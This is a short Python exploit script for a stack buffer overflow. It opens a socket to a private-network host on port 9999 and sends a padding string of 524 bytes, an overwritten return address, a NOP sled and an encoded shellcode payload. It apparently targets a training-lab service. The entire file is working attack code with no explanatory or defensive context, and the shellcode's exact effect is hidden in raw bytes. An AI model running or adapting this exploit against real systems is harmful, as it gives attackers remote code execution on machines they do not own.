#!/usr/bin/python3
import socket
ip = "10.10.83.134"

port = 9999
timeout = 5
prefix = b""
offset = 524
NOP = b"\x90" * 20
returnAdd = b"\xf3\x12\x17\x31"
buf =  b""
buf += b"\xba\x7b\xf0\x93\xe9\xd9\xc4\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x12\x83\xee\xfc\x31\x56\x0e\x03\x2d\xfe\x71"
buf += b"\x1c\xe0\x25\x82\x3c\x51\x99\x3e\xa9\x57\x94\x20\x9d"
buf += b"\x31\x6b\x22\x4d\xe4\xc3\x1c\xbf\x96\x6d\x1a\xc6\xfe"
buf += b"\x67\xd7\x09\x0f\x1f\xe5\x69\xfe\xbc\x60\x88\xb0\x5b"
buf += b"\x23\x1a\xe3\x10\xc0\x15\xe2\x9a\x47\x77\x8c\x4a\x67"
buf += b"\x0b\x24\xfb\x58\xc4\xd6\x92\x2f\xf9\x44\x36\xb9\x1f"
buf += b"\xd8\xb3\x74\x5f"


buffer = b"A" * offset + returnAdd + NOP + buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print(resp)


s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	
